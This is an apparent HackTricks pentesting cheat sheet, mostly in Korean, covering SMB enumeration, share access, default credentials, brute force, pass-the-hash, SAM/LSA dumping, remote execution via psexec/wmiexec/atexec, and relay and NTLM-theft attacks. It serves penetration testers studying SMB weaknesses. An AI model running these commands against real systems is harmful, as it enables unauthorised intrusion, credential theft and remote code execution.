# 139,445 - Pentesting SMB

{{#include ../../banners/hacktricks-training.md}}

## **포트 139**

The _**Network Basic Input Output System**_** (NetBIOS)** 은 로컬 영역 네트워크(LAN) 내의 애플리케이션, PC 및 데스크톱이 네트워크 하드웨어와 상호작용하고 **네트워크를 통한 데이터 전송을 용이하게 하는** 소프트웨어 프로토콜입니다. NetBIOS 네트워크에서 동작하는 소프트웨어 애플리케이션의 식별 및 위치 확인은 NetBIOS 이름을 통해 이루어지며, 해당 이름은 최대 16자까지 가능하고 종종 컴퓨터 이름과 다릅니다. 두 애플리케이션 간의 NetBIOS 세션은 한 애플리케이션(클라이언트 역할)이 다른 애플리케이션(서버 역할)을 "call" 하도록 명령을 발행할 때 **TCP Port 139**를 이용하여 시작됩니다.
```
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
```
## Port 445

기술적으로, Port 139은 ‘NBT over IP’로 불리는 반면, Port 445는 ‘SMB over IP’로 식별됩니다. 약어 **SMB**는 ‘**Server Message Blocks**’를 의미하며, 현대에는 **Common Internet File System (CIFS)**로도 알려져 있습니다. 애플리케이션 계층 네트워크 프로토콜로서 SMB/CIFS는 주로 파일, 프린터, 시리얼 포트에 대한 공유 접근을 가능하게 하고 네트워크 상의 노드 간 다양한 형태의 통신을 촉진하는 데 사용됩니다.

예를 들어, Windows 맥락에서는 SMB가 포트 445를 통해 TCP/IP 위에서 직접 작동할 수 있어 NetBIOS over TCP/IP가 불필요해진다는 점이 강조됩니다. 반대로 다른 시스템에서는 포트 139의 사용이 관찰되며, 이는 SMB가 NetBIOS over TCP/IP와 함께 실행되고 있음을 나타냅니다.
```
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```
### SMB

The **Server Message Block (SMB)** protocol, operating in a **client-server** model, is designed for regulating **access to files**, directories, and other network resources like printers and routers. Primarily utilized within the **Windows** operating system series, SMB ensures backward compatibility, allowing devices with newer versions of Microsoft's operating system to seamlessly interact with those running older versions. Additionally, the **Samba** project offers a free software solution, enabling SMB's implementation on **Linux** and **Unix** systems, thereby facilitating cross-platform communication through SMB.

Shares, representing **arbitrary parts of the local file system**, can be provided by an SMB server, making the hierarchy visible to a client partly **independent** from the server's actual structure. The **Access Control Lists (ACLs)**, which define **access rights**, allow for **fine-grained control** over user permissions, including attributes like **`execute`**, **`read`**, and **`full access`**. These permissions can be assigned to individual users or groups, based on the shares, and are distinct from the local permissions set on the server.

### IPC$ Share

Access to the IPC$ share can be obtained through an anonymous null session, allowing for interaction with services exposed via named pipes. The utility `enum4linux` is useful for this purpose. Utilized properly, it enables the acquisition of:

- 운영체제 정보
- 상위 도메인 정보
- 로컬 사용자 및 그룹 목록
- 사용 가능한 SMB shares 정보
- 적용 중인 시스템 보안 정책

This functionality is critical for network administrators and security professionals to assess the security posture of SMB (Server Message Block) services on a network. `enum4linux` provides a comprehensive view of the target system's SMB environment, which is essential for identifying potential vulnerabilities and ensuring that the SMB services are properly secured.
```bash
enum4linux -a target_ip
```
위 명령은 `enum4linux`를 사용해 `target_ip`로 지정한 대상에 대해 전체 열거를 수행하는 방법의 예입니다.

## NTLM이란 무엇인가

만약 **NTLM**이 무엇인지 모르거나 그 작동 방식과 악용 방법을 알고 싶다면, **NTLM**에 관한 이 페이지가 매우 흥미로울 것입니다. 이 페이지에는 **이 프로토콜이 어떻게 작동하는지와 이를 어떻게 활용할 수 있는지**가 설명되어 있습니다:


{{#ref}}
../../windows-hardening/ntlm/
{{#endref}}

## **서버 열거**

### **Scan** 네트워크에서 호스트를 검색:
```bash
nbtscan -r 192.168.0.1/24
```
### SMB 서버 버전

SMB 버전에 대한 가능한 익스플로잇을 찾기 위해서는 어떤 버전이 사용 중인지 아는 것이 중요합니다. 이 정보가 다른 도구들에서 나타나지 않는다면, 다음을 사용할 수 있습니다:

- **MSF** 보조 모듈 `**auxiliary/scanner/smb/smb_version**`
- 또는 이 스크립트:
```bash
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1
```
### **exploit 검색**
```bash
msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
```
### **가능한** 자격 증명

| **사용자 이름(들)** | **일반 비밀번호**                         |
| -------------------- | ----------------------------------------- |
| _(빈칸)_             | _(빈칸)_                                  |
| guest                | _(빈칸)_                                  |
| Administrator, admin | _(빈칸)_, password, administrator, admin  |
| arcserve             | arcserve, backup                          |
| tivoli, tmersrvd     | tivoli, tmersrvd, admin                   |
| backupexec, backup   | backupexec, backup, arcada               |
| test, lab, demo      | password, test, lab, demo                 |

### Brute Force

- [**SMB Brute Force**](../../generic-hacking/brute-force.md#smb)

### SMB 환경 정보

### 정보 획득
```bash
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```
### 사용자, 그룹 및 로그인한 사용자 열거

이 정보는 이미 enum4linux 및 enum4linux-ng에서 수집되었어야 합니다.
```bash
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups
```
### 로컬 사용자 열거

[Impacket](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)
```bash
lookupsid.py -no-pass hostname.local
```
한 줄 명령
```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.10.10.10 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
### Metasploit - 로컬 사용자 열거
```bash
use auxiliary/scanner/smb/smb_lookupsid
set rhosts hostname.local
run
```
### **LSARPC 및 SAMR rpcclient 열거**


{{#ref}}
rpcclient-enumeration.md
{{#endref}}

### Linux에서 GUI 연결

#### 터미널에서:

`xdg-open smb://cascade.htb/`

#### 파일 브라우저 창에서 (nautilus, thunar 등)

`smb://friendzone.htb/general/`

## 공유 폴더 열거

### 공유 폴더 나열

가능한 항목에 접근할 수 있는지 항상 확인하는 것이 좋습니다. 자격 증명이 없는 경우 **null** **credentials/guest user**를 사용해 보세요.
```bash
smbclient --no-pass -L //<IP> # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] #Recursive list

crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
```
### **공유 폴더 연결/목록 보기**
```bash
#Connect using smbclient
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

#List with smbmap, without folder it list everything
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
```
### **수동으로 Windows 공유를 열거하고 연결하기**

호스트 머신의 공유 표시가 제한되어 있어 공유를 나열하려 할 때 연결할 수 있는 공유가 전혀 없는 것처럼 보일 수 있습니다. 따라서 수동으로 공유에 직접 연결을 시도해 보는 것이 좋습니다. 공유를 수동으로 열거하려면 유효한 세션(예: null session 또는 유효한 자격증명)을 사용할 때 NT_STATUS_ACCESS_DENIED 또는 NT_STATUS_BAD_NETWORK_NAME 같은 응답을 확인해 보십시오. 이 응답들은 공유가 존재하지만 접근 권한이 없음을 나타내거나, 공유가 아예 존재하지 않음을 알리는 신호일 수 있습니다.

Common share names for windows targets are

- C$
- D$
- ADMIN$
- IPC$
- PRINT$
- FAX$
- SYSVOL
- NETLOGON

(일반적인 공유 이름 출처: _**Network Security Assessment 3rd edition**_)

다음 명령을 사용해 해당 공유에 연결을 시도할 수 있습니다
```bash
smbclient -U '%' -N \\\\<IP>\\<SHARE> # null session to connect to a windows share
smbclient -U '<USER>' \\\\<IP>\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)
```
또는 이 script (null session을 사용하여)
```bash
#/bin/bash

ip='<TARGET-IP-HERE>'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')

for share in ${shares[*]}; do
output=$(smbclient -U '%' -N \\\\$ip\\$share -c '')

if [[ -z $output ]]; then
echo "[+] creating a null session is possible for $share" # no output if command goes through, thus assuming that a session was created
else
echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
fi
done
```
예제
```bash
smbclient -U '%' -N \\\\192.168.0.24\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME
smbclient -U '%' -N \\\\192.168.0.24\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session
```
### **Windows에서 공유 열거 / 타사 도구 없이**

PowerShell
```bash
# Retrieves the SMB shares on the locale computer.
Get-SmbShare
Get-WmiObject -Class Win32_Share
# Retrieves the SMB shares on a remote computer.
get-smbshare -CimSession "<computer name or session object>"
# Retrieves the connections established from the local SMB client to the SMB servers.
Get-SmbConnection
```
CMD 콘솔
```shell
# List shares on the local computer
net share
# List shares on a remote computer (including hidden ones)
net view \\<ip> /all
```
MMC 스냅인 (그래픽)
```shell
# Shared Folders: Shared Folders > Shares
fsmgmt.msc
# Computer Management: Computer Management > System Tools > Shared Folders > Shares
compmgmt.msc
```
explorer.exe (graphical)에서 `\\<ip>\`를 입력하여 사용 가능한 non-hidden shares를 확인합니다.

### 공유 폴더 마운트
```bash
mount -t cifs //x.x.x.x/share /mnt/share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
```
### **파일 다운로드**

이전 섹션을 읽어 credentials/Pass-the-Hash를 사용해 연결하는 방법을 알아보세요.
```bash
#Search a file and download
sudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap
```

```bash
#Download all
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
#Download everything to current directory
```
명령어:

- mask: 디렉터리 내 파일을 필터링하는 데 사용되는 마스크를 지정합니다 (e.g. "" for all files)
- recurse: 재귀 처리를 전환합니다 (기본값: off)
- prompt: 파일명 프롬프트를 전환합니다(기본값: on)
- mget: 호스트에서 클라이언트 머신으로 마스크에 일치하는 모든 파일을 복사합니다

(_smbclient의 매뉴얼에서 가져온 정보_)

### 도메인 공유 폴더 검색

- [**Snaffler**](https://github.com/SnaffCon/Snaffler)
```bash
Snaffler.exe -s -d domain.local -o snaffler.log -v data
```
- [**CrackMapExec**](https://wiki.porchetta.industries/smb-protocol/spidering-shares) spider.
- `-M spider_plus [--share <share_name>]`
- `--pattern txt`
```bash
sudo crackmapexec smb 10.10.10.10 -u username -p pass -M spider_plus --share 'Department Shares'
```
공유에서 특히 흥미로운 파일은 **`Registry.xml`**인데, 이 파일은 Group Policy를 통해 **autologon**으로 구성된 사용자들의 **비밀번호를 포함할 수 있습니다**. 또는 자격증명이 들어있는 **`web.config`** 파일들도 있습니다.

> [!TIP]
> **SYSVOL share**는 도메인 내 모든 인증된 사용자에게 **읽기 가능**합니다. 그 안에는 다양한 batch, VBScript, PowerShell **스크립트**들을 **찾을** 수 있습니다.\
> 내부의 **스크립트**들을 **확인**해야 합니다. 왜냐하면 **비밀번호**와 같은 민감한 정보가 포함되어 있을 수 있기 때문입니다.

## 레지스트리 읽기

발견한 자격증명을 사용해 **레지스트리를 읽을** 수 있을지도 모릅니다. Impacket **`reg.py`**를 사용해 시도해볼 수 있습니다:
```bash
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
```
## Post Exploitation

**Samba** 서버의 **기본 구성**은 보통 `/etc/samba/smb.conf`에 위치하며 몇 가지 **위험한 설정**을 포함할 수 있습니다:

| **설정**                    | **설명**                                                            |
| --------------------------- | ------------------------------------------------------------------- |
| `browseable = yes`          | 현재 공유에서 사용 가능한 공유를 나열하도록 허용합니까?             |
| `read only = no`            | 파일의 생성 및 수정을 금지합니까?                                   |
| `writable = yes`            | 사용자가 파일을 생성하고 수정하도록 허용합니까?                      |
| `guest ok = yes`            | 비밀번호 없이 서비스에 연결하는 것을 허용합니까?                     |
| `enable privileges = yes`   | 특정 SID에 할당된 권한을 존중합니까?                               |
| `create mask = 0777`        | 새로 생성된 파일에 어떤 권한이 부여되어야 합니까?                   |
| `directory mask = 0777`     | 새로 생성된 디렉터리에 어떤 권한이 부여되어야 합니까?               |
| `logon script = script.sh`  | 사용자 로그인 시 어떤 스크립트가 실행되어야 합니까?                 |
| `magic script = script.sh`  | 스크립트가 종료될 때 어떤 스크립트가 실행되어야 합니까?             |
| `magic output = script.out` | magic script의 출력이 어디에 저장되어야 합니까?                    |

명령 `smbstatus`는 **서버** 및 **누가 연결되어 있는지**에 대한 정보를 제공합니다.

## Kerberos를 사용한 인증

도구 **smbclient**와 **rpcclient**를 사용하여 **kerberos**에 **인증**할 수 있습니다:
```bash
smbclient --kerberos //ws01win10.domain.com/C$
rpcclient -k ws01win10.domain.com
```
## **명령 실행**

### **crackmapexec**

crackmapexec는 명령을 **악용하여** **mmcexec, smbexec, atexec, wmiexec** 중 어떤 것을 사용할 수 있으며, **wmiexec**가 **기본** 방법입니다. 사용할 옵션은 `--exec-method` 파라미터로 지정할 수 있습니다:
```bash
apt-get install crackmapexec

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #Pass-The-Hash
```
### [**psexec**](../../windows-hardening/lateral-movement/psexec-and-winexec.md)**/**[**smbexec**](../../windows-hardening/lateral-movement/smbexec.md)

두 옵션은 피해자 머신에 **새 서비스를 생성**(SMB를 통해 _\pipe\svcctl_ 사용)하고 이를 이용해 **무언가를 실행**합니다 (**psexec**는 실행 파일을 ADMIN$ 공유에 **업로드**하고 **smbexec**는 **cmd.exe/powershell.exe**를 가리키며 인수에 페이로드를 넣습니다 --**file-less technique-**-).\
**추가 정보**: [**psexec** ](../../windows-hardening/lateral-movement/psexec-and-winexec.md)와 [**smbexec**](../../windows-hardening/lateral-movement/smbexec.md).\
**kali**에서는 /usr/share/doc/python3-impacket/examples/에 위치합니다.
```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
```
**parameter**`-k`을(를) 사용하면 **NTLM** 대신 **kerberos**로 인증할 수 있습니다.

### [wmiexec](../../windows-hardening/lateral-movement/wmiexec.md)/dcomexec

디스크를 건드리거나 새로운 서비스를 실행하지 않고 DCOM을 통해 **port 135.**\ 사용하여 커맨드 셸을 은밀하게 실행합니다.  
**kali**에서는 /usr/share/doc/python3-impacket/examples/에 위치합니다.
```bash
#If no password is provided, it will be prompted
./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password
./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
**매개변수**`-k`를 사용하면 **NTLM** 대신 **kerberos**로 인증할 수 있습니다.
```bash
#If no password is provided, it will be prompted
./dcomexec.py [[domain/]username[:password]@]<targetName or address>
./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
### [AtExec](../../windows-hardening/lateral-movement/atexec.md)

Task Scheduler를 통해 명령을 실행합니다 (SMB를 통해 _\pipe\atsvc_ 사용).\
**kali**에서는 /usr/share/doc/python3-impacket/examples/에 위치합니다.
```bash
./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
```
## Impacket 참고

[https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)

### ksmbd 공격 표면 및 SMB2/SMB3 프로토콜 퍼징 (syzkaller)

{{#ref}}
ksmbd-attack-surface-and-fuzzing-syzkaller.md
{{#endref}}

## **Bruteforce users credentials**

**권장하지 않습니다. 허용된 최대 시도 횟수를 초과하면 계정이 차단될 수 있습니다**
```bash
nmap --script smb-brute -p 445 <IP>
ridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce each user name
```
## SMB relay attack

이 공격은 Responder 툴킷을 사용하여 내부 네트워크에서 **SMB authentication sessions**을 캡처하고, 이를 **relays** 하여 **target machine**으로 전달합니다. 인증 **session is successful** 하면 자동으로 **system** **shell**에 들어가게 됩니다.  
[**이 공격에 대한 자세한 정보는 여기를 참조하세요.**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

## SMB-Trap

Windows 라이브러리 URLMon.dll은 페이지가 SMB를 통해 일부 컨텐츠에 접근하려 할 때 자동으로 호스트에 인증을 시도합니다. 예: `img src="\\10.10.10.10\path\image.jpg"`

이 동작은 다음 함수들에서 발생합니다:

- URLDownloadToFile
- URLDownloadToCache
- URLOpenStream
- URLOpenBlockingStream

이 함수들은 일부 브라우저 및 도구(예: Skype)에서 사용됩니다.

![출처: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../../images/image (358).png>)

### SMBTrap using MitMf

![출처: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../../images/image (892).png>)

## NTLM Theft

SMB Trapping과 유사하게, 예를 들어 SMB를 통해 target system에 악성 파일을 심는 것은 SMB 인증 시도를 유발할 수 있으며, Responder 같은 도구로 NetNTLMv2 해시를 가로챌 수 있습니다. 그런 해시는 오프라인에서 크랙되거나 [SMB relay attack](#smb-relay-attack)에 사용될 수 있습니다.

[참조: ntlm_theft](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#ntlm_theft)

## HackTricks 자동 명령
```
Protocol_Name: SMB    #Protocol Abbreviation if there is one.
Port_Number:  137,138,139     #Comma separated if there is more than one.
Protocol_Description: Server Message Block         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMB
Note: |
While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.

#These are the commands I run in order every time I see an open SMB port

With No Creds
nbtscan {IP}
smbmap -H {IP}
smbmap -H {IP} -u null -p null
smbmap -H {IP} -u guest
smbclient -N -L //{IP}
smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
rpcclient {IP}
rpcclient -U "" {IP}
crackmapexec smb {IP}
crackmapexec smb {IP} --pass-pol -u "" -p ""
crackmapexec smb {IP} --pass-pol -u "guest" -p ""
GetADUsers.py -dc-ip {IP} "{Domain_Name}/" -all
GetNPUsers.py -dc-ip {IP} -request "{Domain_Name}/" -format hashcat
GetUserSPNs.py -dc-ip {IP} -request "{Domain_Name}/"
getArch.py -target {IP}

With Creds
smbmap -H {IP} -u {Username} -p {Password}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
crackmapexec smb {IP} -u {Username} -p {Password} --shares
GetADUsers.py {Domain_Name}/{Username}:{Password} -all
GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request

https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html

Entry_2:
Name: Enum4Linux
Description: General SMB Scan
Command: enum4linux -a {IP}

Entry_3:
Name: Nmap SMB Scan 1
Description: SMB Vuln Scan With Nmap
Command: nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}

Entry_4:
Name: Nmap Smb Scan 2
Description: SMB Vuln Scan With Nmap (Less Specific)
Command: nmap --script 'smb-vuln*' -Pn -p 139,445 {IP}

Entry_5:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb

Entry_6:
Name: SMB/SMB2 139/445 consolesless mfs enumeration
Description: SMB/SMB2 139/445  enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit'

```
{{#include ../../banners/hacktricks-training.md}}
